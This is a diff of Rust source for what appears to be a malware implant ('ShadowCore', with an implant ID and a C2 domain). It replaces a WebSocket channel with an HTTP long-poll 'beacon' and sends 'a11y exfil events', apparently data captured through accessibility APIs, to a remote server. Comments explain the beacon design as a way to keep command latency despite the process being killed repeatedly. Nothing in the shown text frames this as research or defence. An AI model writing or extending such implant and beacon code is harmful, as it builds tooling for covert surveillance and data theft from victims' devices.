@@ -205,7 +205,10 @@ struct ShadowCore {
 
 impl ShadowCore {
     async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
-        let ws = transport::websocket::WsTransport::new(&self.domain, &self.implant_id);
+        // HTTP long-poll beacon: this process is reaped every ~48s, so a persistent
+        // socket is fictional here. The beacon parks on the DO and is resolved the
+        // moment a command lands, which keeps push latency without socket ownership.
+        let beacon = transport::poll::PollTransport::new(&self.domain, &self.implant_id);
         let (tx_send, rx_send) = mpsc::channel::<Vec<u8>>(100);
 
         // Wire a11y exfil events into transport outbound
@@ -307,14 +310,14 @@ impl ShadowCore {
                     }
                 });
 
-                if let Err(e) = ws.connect(rx_internal, tx_recv_internal).await {
+                if let Err(e) = beacon.run(rx_internal, tx_recv_internal).await {
                     error!("Transport error: {}", e);
                 }
 
                 proxy.abort();
                 inbound.abort();
 
-                info!("WSS reconnecting in {:?}...", backoff);
+                info!("BEACON reconnecting in {:?}...", backoff);
                 tokio::time::sleep(backoff).await;
                 backoff = std::cmp::min(backoff * 2, max_backoff);
             }
